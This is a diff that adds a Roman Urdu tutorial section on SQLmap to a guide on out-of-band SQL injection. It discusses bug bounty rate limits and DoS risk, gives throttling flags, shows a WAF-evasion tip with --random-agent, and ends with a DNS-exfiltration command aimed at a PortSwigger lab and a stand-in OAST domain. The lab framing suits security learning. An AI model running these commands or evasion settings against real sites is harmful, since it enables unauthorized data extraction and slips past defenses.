@@ -56,3 +56,44 @@ Aisi websites jo custom webhooks aur DNS listening free mein deti hain (jaise pi
 | **SQLmap** | 100% Free (Pre-installed in Kali) | Terminal Command | Automated OAST & time-based extraction |
 | **DNSLog.cn / Pingb.in** | Free | Direct Web Browser | Quick one-off DNS payload validation |
 
+---
+
+### Real Websites Par SQLmap Allowed Hai Ya Nahi?
+Short answer: **Sahi tareeqay se chalana allowed hai, lekin bilkul default/aggressive mode par chalana strict rules ke khilaf ho sakta hai.**
+ * **Bug Bounty Rules (Scope & Rate Limit):**
+   Bohot se bug bounty platforms (HackerOne, Bugcrowd) aur client authorization letters mein strict rule hota hai ke aap automated scanners/tools se target web application ko overwhelm (down) nahi kar sakte.
+ * **Server Load Risk:**
+   SQLmap by default aik second mein do-teen-so (200-300) HTTP requests bhejta hai. Agar website choti ho ya server weak ho, toh SQLmap ka yeh aggressive traffic target website par **Denial of Service (DoS)** yani server crash kar sakta hai.
+ * **WAF / Firewall Alert:**
+   Aggressive requests se Web Application Firewall (WAF) jaise Cloudflare ya AWS WAF aap ke IP address ko fawran block kar dega aur SOC security team ko alert chala jaye ga.
+### Real-World Penetration Testing Mein SQLmap Chalane Ka Tarika
+Professionals real websites par SQLmap ko control aur stealth settings ke sath chalate hain taake server par load na pare. Tum in flags ko yaad rakho:
+ * **Requests Ko Dheema (Slow) Karna (--delay aur --threads):**
+   Server load se bachne ke liye requests ke darmiyan gap diya jata hai:
+   ```bash
+   sqlmap -u "https://example.com/page?id=1" --delay=1 --threads=1
+   
+   ```
+   *(Yeh har request ke darmiyan 1 second ka pause rakhega taake server crash na ho).*
+ * **Request Speed Stop/Control (--rate-limit):**
+   Aap specify kar sakte hain ke ek minute mein kitni requests bhejni hain:
+   ```bash
+   sqlmap -u "https://example.com/page?id=1" --rate-limit=10
+   
+   ```
+ * **WAF/Security Firewall Bypass (--tamper & --random-agent):**
+   Default SQLmap User-Agent request header mein sqlmap/1.x likha hota hai jo firewall fawran pakad leta hai. Is se bachne ke liye:
+   ```bash
+   sqlmap -u "https://example.com/page?id=1" --random-agent --batch
+   
+   ```
+### SQLmap Se Blind OAST DNS Exploitation Seekhna
+PortSwigger wali OAST lab ya practice environments par SQLmap ke zariye DNS exfiltration perform karne ke liye tum --dns-domain flag ka use kar sakte ho:
+ 1. Free domain service (jaise interactsh-client ya dnslog.cn) se ek testing domain hash copy karo (e.g. c123.oast.live).
+ 2. SQLmap ko yeh command do:
+   ```bash
+   sqlmap -u "https://YOUR-LAB.web-security-academy.net/" --cookie="TrackingId=xyz" -p "TrackingId" --dns-domain="c123.oast.live" --technique=O --batch
+   
+   ```
+Is se SQLmap automatic Out-of-band payloads bana kar aap ke testing domain par DNS requests bhej kar fast data dump kar ke de dega!
+
